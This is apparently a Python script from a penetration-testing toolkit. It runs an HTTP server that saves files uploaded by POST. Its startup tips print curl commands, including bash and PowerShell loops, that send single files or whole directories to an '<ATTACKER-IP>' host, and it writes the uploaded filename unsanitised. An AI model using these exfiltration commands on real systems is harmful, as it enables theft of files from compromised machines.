# https://github.com/manesec/tools4mane
# write by @manesec.

# Reference : https://stackoverflow.com/questions/46332093/how-to-get-data-from-fieldstorage
# Reference : https://gist.github.com/touilleMan/eb02ea40b93e52604938

import http.server, socketserver
import io, re ,os
import argparse


print("""
 ▄▀▀▄ ▄▀▄  ▄▀▀█▄   ▄▀▀▄ ▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▄▄▄▄  
█  █ ▀  █ ▐ ▄▀ ▀▄ █  █ █ █ ▐  ▄▀   ▐ █ █   ▐ ▐  ▄▀   ▐ █ █    ▌ 
▐  █    █   █▄▄▄█ ▐  █  ▀█   █▄▄▄▄▄     ▀▄     █▄▄▄▄▄  ▐ █      
  █    █   ▄▀   █   █   █    █    ▌  ▀▄   █    █    ▌    █      
▄▀   ▄▀   █   ▄▀  ▄▀   █    ▄▀▄▄▄▄    █▀▀▀    ▄▀▄▄▄▄    ▄▀▄▄▄▄▀ 
█    █    ▐   ▐   █    ▐    █    ▐    ▐       █    ▐   █     ▐  
▐    ▐            ▐         ▐                 ▐        ▐        
    Simple File Receiver via http post - Tools4me by @manesec.
                    Version: 20221008
            https://github.com/manesec/tools4mane
---------------------------------------------------------------""")

parser = argparse.ArgumentParser(description='Simple File Receiver via http post.',\
    formatter_class=argparse.RawDescriptionHelpFormatter,\
    epilog="""\
Example:
  
  # Start server ...
  SimpleFileReceiver.py

  # force rename start with 'file'
  SimpleFileReceiver.py -r file

""")

parser.add_argument('-l',"--listen",type=str, default="0.0.0.0", help="Listen interface, default is 0.0.0.0")
parser.add_argument('-p',"--port",type=int, default=8080, help="Listen port, default is 8080")
parser.add_argument('-d',"--directory",type=str, default=".", help="Save file directory.")
parser.add_argument('-f',"--formstr",type=str, default="file", help="Post from str, like: form['file']")
parser.add_argument('-r',"--rename",type=str, default="<none>", help="Rename the file start with str.")

args = parser.parse_args()

rename_index = 0

if not (os.path.exists(args.directory)):
    print("[*] Making %s directory ..." % (args.directory))
    from pathlib import Path
    path = Path(args.directory)
    path.mkdir(parents=True, exist_ok=True)

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):     
        print("[*] Receiving post requests by %s:%s ..." % (self.client_address[0],self.client_address[1]))

        return_status = self.deal_post_data()

        f = io.BytesIO()
        if return_status:
            f.write(b"ok \n")
        else:
            f.write(b"error\n")

        length = f.tell()
        f.seek(0)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        if f:
            self.copyfile(f, self.wfile)
            f.close()      

    def deal_post_data(self):
        global rename_index
        content_type = self.headers['content-type']
        if not content_type:
            print("[E] Content-Type header doesn't contain boundary")
            return False

        boundary = content_type.split("=")[1].encode()
        remainbytes = int(self.headers['content-length'])
        line = self.rfile.readline()
        remainbytes -= len(line)
        if not boundary in line:
            print("[E] Content NOT have boundary")
            return False

        line = self.rfile.readline()
        remainbytes -= len(line)
        filename = re.findall(r'Content-Disposition.*name="%s"; filename="(.*)"' % (args.formstr), line.decode())
        if not filename:
            print("[E] Can't find out file name...")
            return False

        if args.rename != "<none>":
            filename = os.getcwd() + "/" + args.directory + "/" + "%s-%s" % (args.rename,rename_index)
            rename_index += 1
        else:
            path = self.translate_path(self.path)
            filename = os.path.join(path, filename[0])

        line = self.rfile.readline()
        remainbytes -= len(line)
        line = self.rfile.readline()
        remainbytes -= len(line)
        try:
            out = open(filename, 'wb')
        except IOError:
            print("[E] Can't create file to write, do you have permission to write?")
            return False
                
        preline = self.rfile.readline()
        remainbytes -= len(preline)
        while remainbytes > 0:
            line = self.rfile.readline()
            remainbytes -= len(line)
            if boundary in line:
                preline = preline[0:-1]
                if preline.endswith(b'\r'):
                    preline = preline[0:-1]
                out.write(preline)
                out.close()
                print("[*] File '%s' upload success!" % filename)
                return True
            else:
                out.write(preline)
                preline = line
        print("[E] Unexpect Ends of data.")
        return False

Handler = CustomHTTPRequestHandler
with socketserver.TCPServer((args.listen, args.port), Handler) as httpd:
    showserver = "<ATTACKER-IP>"
    if not (args.listen == "0.0.0.0"):
        showserver = args.listen

    print(f"""
    Tips: Upload file command like :
        curl -F '{args.formstr}=@<FILENAME>' http://{showserver}:{args.port}/
        cmd.exe /c curl -F '{args.formstr}=@<filename>' http://{showserver}:{args.port}/
    
    Tips: Upload folder like :
        for f in *; do curl -F "{args.formstr}=@$f" http://{showserver}:{args.port}/ ; done
        gci -file -recurse "<directory>" | foreach {{ cmd.exe /c curl -F "{args.formstr}=@$($_.FullName)"  http://{showserver}:{args.port}/ }}
    """)

    print("[*] Starting SimpleFileReceiver in %s:%s ..." % (args.listen,args.port))

    httpd.serve_forever()